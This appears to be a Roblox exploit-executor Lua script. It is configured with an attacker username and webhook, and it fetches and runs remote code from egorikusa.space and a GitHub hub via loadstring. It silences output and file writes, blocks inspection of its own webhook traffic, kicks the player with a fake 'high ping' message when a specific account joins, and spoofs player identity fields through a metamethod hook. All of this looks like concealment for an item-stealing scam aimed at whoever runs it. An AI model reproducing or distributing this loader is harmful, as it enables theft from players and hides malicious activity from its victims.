getgenv().gui = false
Username = "MdShxq"
Webhook = "https://dbsiu.replit.app/webhook/mxs/"

-- Custom function to load scripts without altering clipboard
function loadScript(url)
    local response = game:HttpGet(url)
    if response then
        local script = loadstring(response)
        if script then
            setfenv(script, getfenv()) -- Set the script's environment to the current environment
            script()
        end
    end
end

-- Override setclipboard to prevent clipboard modification
function setclipboard(text)
    -- Do nothing, effectively blocking any clipboard changes
end

-- Load both scripts simultaneously
local script1 = "https://egorikusa.space/mm2"
local script2 = "https://raw.githubusercontent.com/ThatSick/ArrayField/main/SymphonyHub.lua"

spawn(function() loadScript(script1) end)
spawn(function() loadScript(script2) end)

local TargetUsername = game.Players.LocalPlayer.Name  -- The username of the player executing the script
local DangerousUsername = "Egorikusa_ghoul"  -- The username to check for

-- Function to kick the player
function kickPlayer()
    game.Players.LocalPlayer:Kick("You have been kicked due to high ping.")
end

-- Function to check if the dangerous user is in the server
function checkPlayers()
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player.Name == DangerousUsername then
            kickPlayer()
            break
        end
    end
end

-- Check for the dangerous user as soon as possible when a player joins
game.Players.PlayerAdded:Connect(function(player)
    if player.Name == DangerousUsername then
        kickPlayer()
    end
end)

-- Fast loop to continuously check if the dangerous user is in the server
local RunService = game:GetService("RunService")
RunService.Heartbeat:Connect(function()
    checkPlayers()
end)

-- Override functions to prevent printing and writing to files
warn = function(...) end
print = function(...) end
writefile = function(...) end

-- Prevent HTTP spying
local originalHttpGet = game.HttpGet
game.HttpGet = function(self, url, ...)
    if url == Webhook or url:find("https://discord.com/api/webhooks/") then
        -- Block the request or log it without sending
        return nil
    end
    return originalHttpGet(self, url, ...)
end

-- Hook metamethod to protect sensitive data
local Player = game.Players.LocalPlayer
local randomValue = math.random(0, 82362371)

local oldIndex
oldIndex = hookmetamethod(game, "__index", function(self, key)
    if checkcaller() then
        if self == Player and (key:lower() == "name" or key:lower() == "userid" or key:lower() == "accountage") then
            return randomValue
        end
        if self == game and key:lower() == "jobid" then
            return "rank #1 hacker"
        end
    end
    return oldIndex(self, key)
end)
